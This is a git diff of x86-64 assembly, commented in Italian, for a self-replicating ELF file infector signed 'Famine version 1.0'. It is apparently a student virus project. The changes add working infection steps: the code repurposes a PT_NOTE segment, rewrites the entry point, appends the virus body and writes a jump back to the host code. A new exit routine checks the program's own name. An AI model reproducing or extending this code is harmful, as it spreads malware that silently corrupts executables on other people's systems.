@@ -122,11 +122,7 @@ _start:
     syscall
 ;---------------------------------------------------------------
 
-exit:
-    mov rsp, rbp                      ; ripristino lo stack
-    mov rdi, 0                        ; error code
-    mov rax, 60
-    syscall
+    jmp exit
 
 open:                                 ; rdi = fd, rsi = permessi
     mov rdx, 0                        ; flag
@@ -223,10 +219,10 @@ mmap:                                 ; rsi = size, r8 = fd
 
 infect_file:                          ; rdi = ptr nome file
 ; open
-    mov rsi, 1026
+    mov rsi, 1026                     ; permessi per open
     call open                         ; rax = fd
     cmp rax, 0
-    jb exit
+    jl .ret                           ; se fd < 0 allora ret
     mov [rsp+36920], rax
 ; lseek
     push rax
@@ -263,6 +259,7 @@ infect_file:                          ; rdi = ptr nome file
     mov rdi, [rsp+36920]
     call closefd
 ; ret
+    .ret:
     ret
 
     .finded:                          ; rcx = ptr section PT_NOTE
@@ -281,15 +278,90 @@ infect_file:                          ; rdi = ptr nome file
     sub ecx, esi                      ; ecx -= p_vaddr
     sub ecx, r12d                     ; ecx -= size payload
     ; ecx = (uint32_t)offsetJump
-; write
-    mov rdi, [rsp+36920]
+    mov [r10+ehdr.e_entry], esi       ; e_entry = p_vaddr
+; write payload
+    mov rdi, [rsp+36920]              ; rdi = fd file
     lea rsi, [rel _start]
     mov rdx, r12
     mov rax, 1
+    push rcx                          ; salvo ecx prima della syscall
     syscall
+; write jmp per payload
+    pop rcx                           ; ripristino ecx
+    sub rsp, 5
+    mov dword [rsp+1], ecx
+    mov byte [rsp], 0xe9
+
+    mov rsi, rsp
+    mov rdx, 5
+    mov rax, 1
+    syscall
+    add rsp, 5
+
     jmp .end
 
 firma:
     db 'Famine version 1.0 (c)oded by usavoia-usavoia', 0x00
+
+strlen:
+    mov rax, -1                       ;i = -1
+    .loop:                            ;while
+        inc rax                       ;i++
+        cmp byte [rdi + rax], 0       ;if str[i] != 0
+        jne .loop                     ;continue loop
+    ret                               ;return i
+
+strcmp:
+    mov rax, -1                       ;i = -1
+    .loop:                            ;while
+        inc rax                       ;i++
+        mov cl, byte [rdi + rax]      ;cl = first[i]
+        mov dl, byte [rsi + rax]      ;dl = second[i]
+        cmp cl, 0                     ;if cl == 0
+        je .end                       ;then exit
+        cmp dl, 0                     ;if dl == 0
+        je .end                       ;then exit
+        cmp cl, dl                    ;cl compare dl
+        je .loop                       ;cl == dl then loop
+        jmp .end                      ;else end
+    .end:
+        cmp cl, dl                    ;cl compare dl
+        je .equal                      ;if cl == dl
+        jb .negative                   ;if cl < dl
+        ja .positive                   ;if cl > dl
+    .equal:
+        mov rax, 0                    ;return 0
+        ret
+    .negative:
+        mov rax, -1                   ;return -1
+        ret
+    .positive:
+        mov rax, 1                    ;return 1
+        ret
+
+exit:
+    mov rdi, [rbp + 8 * 1]            ; rdi = ptr filename
+    call strlen
+    cmp rax, 6
+    jl .exit_payload
+
+    add rdi, rax                      ; rdi += len
+    sub rdi, 6                        ; rdi -= 6
+
+    sub rsp, 12                       ; riservo spazio per 'famine'
+    mov dword [rsp+4], `ne\0\0`
+    mov dword [rsp], 'fami'
+    mov rsi, rsp                      ; rsi = ptr a 'famine'
+    call strcmp
+    cmp rax, 0                        ; se non si tratta di 'famine'
+    jne .exit_payload                 ; allora .exit_payload
+
+    mov rsp, rbp                      ; ripristino lo stack
+    mov rdi, 0                        ; error code
+    mov rax, 60
+    syscall
+
+    .exit_payload:
+        mov rsp, rbp                  ; ripristino lo stack
 
 end_offset:
